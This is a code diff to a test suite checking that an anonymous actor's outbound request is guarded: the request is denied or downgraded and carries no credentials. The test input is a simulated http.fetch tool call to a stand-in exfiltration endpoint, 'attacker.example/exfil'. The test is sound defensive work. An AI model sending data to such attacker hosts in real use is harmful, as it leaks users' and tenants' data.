@@ -21,8 +21,9 @@
 
 import { describe, it, expect } from 'vitest';
 import { behaviorGate } from '../lib/behavior-gate.js';
-import { driver } from '../lib/driver.js';
 import { readAnonymousActorCap, anonDispatch } from '../lib/anonymousActor.js';
+import { req } from '../lib/requirement-ids.js';
+import { softSkip } from '../lib/soft-skip.js';
 
 const PROFILE = 'openwop-anonymous-actor';
 
@@ -36,19 +37,19 @@ describe('anonymous-actor-egress-guarded (RFC 0132 §C.3)', () => {
       tool: 'http.fetch',
       destination: 'https://attacker.example/exfil',
     });
-    if (res.status === 404 || res.status === 405) return; // seam unwired — soft-skip
+    if (res.status === 404 || res.status === 405) return softSkip('blocked', 'precondition not met — `res.status === 404 || res.status === 405` returned early (seam unwired — soft-skip) (seam, prior step, or fixture unavailable)'); // seam unwired — soft-skip
     const egress = res.json?.egressDecided;
     expect(
       egress,
-      driver.describe('RFC 0132 §C.3', 'an anon egress MUST ride the RFC 0079 egress-decision path'),
+      req('openwop.it.anonymous-actor-egress-guarded.an-out-of-audience-anon-egress-is-denied-downgraded-and-attaches-no-credential', 'RFC 0132 §C.3', 'an anon egress MUST ride the RFC 0079 egress-decision path'),
     ).toBeDefined();
     expect(
       ['denied', 'downgraded'],
-      driver.describe('RFC 0132 §C.3', 'an out-of-audience anon egress MUST be denied or downgraded — never allowed-with-credential'),
+      req('openwop.it.anonymous-actor-egress-guarded.an-out-of-audience-anon-egress-is-denied-downgraded-and-attaches-no-credential', 'RFC 0132 §C.3', 'an out-of-audience anon egress MUST be denied or downgraded — never allowed-with-credential'),
     ).toContain(egress?.decision);
     expect(
       egress?.credentialAttached === true,
-      driver.describe('SECURITY anon-actor-egress-ssrf-guarded', 'no tenant/host credential MUST attach out-of-audience'),
+      req('openwop.it.anonymous-actor-egress-guarded.an-out-of-audience-anon-egress-is-denied-downgraded-and-attaches-no-credential', 'SECURITY anon-actor-egress-ssrf-guarded', 'no tenant/host credential MUST attach out-of-audience'),
     ).toBe(false);
   });
 });
